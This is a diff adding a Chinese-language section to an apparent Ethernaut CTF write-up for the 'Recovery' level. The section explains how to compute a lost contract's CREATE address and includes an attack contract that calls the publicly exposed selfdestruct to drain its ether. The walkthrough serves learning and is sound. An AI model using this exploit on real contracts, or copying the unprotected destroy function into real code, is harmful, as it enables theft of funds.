@@ -919,3 +919,103 @@ await contrcat.owner()
 ```
 - 除了上面的 sstore 之外，也可以在攻击合约里模仿 Preservation 的变量定义然后直接修改对应的 owner 变量；
 
+# Recovery
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Recovery {
+    //generate tokens
+    function generateToken(string memory _name, uint256 _initialSupply) public {
+        new SimpleToken(_name, msg.sender, _initialSupply);
+    }
+}
+
+contract SimpleToken {
+    string public name;
+    mapping(address => uint256) public balances;
+
+    // constructor
+    constructor(string memory _name, address _creator, uint256 _initialSupply) {
+        name = _name;
+        balances[_creator] = _initialSupply;
+    }
+
+    // collect ether in return for tokens
+    receive() external payable {
+        balances[msg.sender] = msg.value * 10;
+    }
+
+    // allow transfers of tokens
+    function transfer(address _to, uint256 _amount) public {
+        require(balances[msg.sender] >= _amount);
+        balances[msg.sender] = balances[msg.sender] - _amount;
+        balances[_to] = _amount;
+    }
+
+    // clean up after ourselves
+    function destroy(address payable _to) public {
+        selfdestruct(_to);
+    }
+}
+```
+要解决这个问题，我们需要从由 Recovery 合约部署的丢失的 SimpleToken 合约中取回 0.001 ether。关键步骤如下：
+- 理解合约地址如何生成：当一个合约使用 CREATE 操作码（在 Solidity 中通过 new 关键字）创建另一个合约时，新合约的地址是根据创建者的地址和他们当时的 nonce（交易次数）确定性计算出来的。
+- 计算丢失合约的地址：因为 SimpleToken 合约是 Recovery 合约创建的第一个（也是唯一一个）合约，所以当时的 nonce 是 1。我们可以利用这个信息和 Recovery 合约的地址来计算丢失的合约地址。
+```solidity
+function computeLostContractAddress(address _creator, uint _nonce) public pure returns (address) {
+    bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, uint8(_nonce));
+    bytes32 hash = keccak256(data);
+    return address(uint160(uint(hash)));
+}
+```
+或者
+```js
+const ethers = require('ethers');
+
+const recoveryAddress = '0xYourRecoveryContractAddress';
+const nonce = 1;
+
+const computedAddress = ethers.utils.getContractAddress({
+    from: recoveryAddress,
+    nonce: nonce
+});
+
+console.log('丢失的 SimpleToken 合约地址:', computedAddress);
+```
+- 与丢失的合约交互：一旦我们知道了地址，就可以与 SimpleToken 合约交互。由于 destroy 函数是公共的，我们可以调用它来触发 selfdestruct，将合约持有的以太币发送到我们指定的地址。
+
+此外，也可以在 etherscan 上找到合约地址：0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64 和上面的函数计算结果一致。
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
+contract Attack {
+    function attack() public {
+        address payable to = payable(address(0xA5d69166aD38B3403FE7894B0FBDA83A6026767C));
+        ISimpleToken(payable(0xF8a061d1a76A071FB6c314609b0bb91A36C8Ee64)).destroy(to);
+    }
+}
+```
+
+补充：地址计算的 RLP 编码 keccack256(RLP_encode(address, nonce))，这里的 nonce 从 1 开始计算（因为合约自身创建 nonce 从变为了 1）
+```
+[
+  0xC0
+    + 1 (a byte for string length) 
+    + 20 (string length itself) 
+    + 1 (nonce), 
+  0x80
+    + 20 (string length),
+  <20 byte string>,
+  <1 byte nonce>
+]
+
+[0xD6, 0x94, <challengeInstance>, 0x01]
+```
+
